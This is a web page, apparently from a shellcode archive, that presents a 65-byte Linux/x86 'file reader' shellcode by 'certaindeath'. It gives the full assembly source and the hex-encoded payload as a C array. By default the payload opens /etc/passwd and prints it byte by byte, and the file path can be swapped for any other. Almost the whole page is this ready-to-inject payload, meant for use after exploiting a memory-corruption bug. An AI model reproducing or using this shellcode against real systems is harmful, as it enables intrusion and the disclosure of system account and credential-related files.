<html><head><title>Linux/x86 - File Reader /etc/passwd - 65 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Linux/x86 file reader.

65 bytes + pathname
Author: certaindeath

Source code:
_start:
	xor	%eax, %eax
	xor	%ebx, %ebx
	xor	%ecx, %ecx
	xor	%edx, %edx
	jmp	two

one:
	pop	%ebx
	
	movb	$5, %al
	xor	%ecx, %ecx
	int	$0x80
	
	mov	%eax, %esi
	jmp	read

exit:
	movb	$1, %al
	xor	%ebx, %ebx
	int	$0x80

read:
	mov	%esi, %ebx
	movb	$3, %al
	sub	$1, %esp
	lea	(%esp), %ecx
	movb	$1, %dl
	int	$0x80

	xor	%ebx, %ebx
	cmp	%eax, %ebx
	je	exit

	movb	$4, %al
	movb	$1, %bl
	movb	$1, %dl
	int	$0x80
	
	add	$1, %esp
	jmp	read

two:
	call	one
	.string	&quot;file_name&quot;
*/
char main[]=
&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2&quot;
&quot;\xeb\x32\x5b\xb0\x05\x31\xc9\xcd&quot;
&quot;\x80\x89\xc6\xeb\x06\xb0\x01\x31&quot;
&quot;\xdb\xcd\x80\x89\xf3\xb0\x03\x83&quot;
&quot;\xec\x01\x8d\x0c\x24\xb2\x01\xcd&quot;
&quot;\x80\x31\xdb\x39\xc3\x74\xe6\xb0&quot;
&quot;\x04\xb3\x01\xb2\x01\xcd\x80\x83&quot;
&quot;\xc4\x01\xeb\xdf\xe8\xc9\xff\xff&quot;
&quot;\xff&quot;
&quot;/etc/passwd&quot;; //Put here the file path, default is /etc/passwd


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
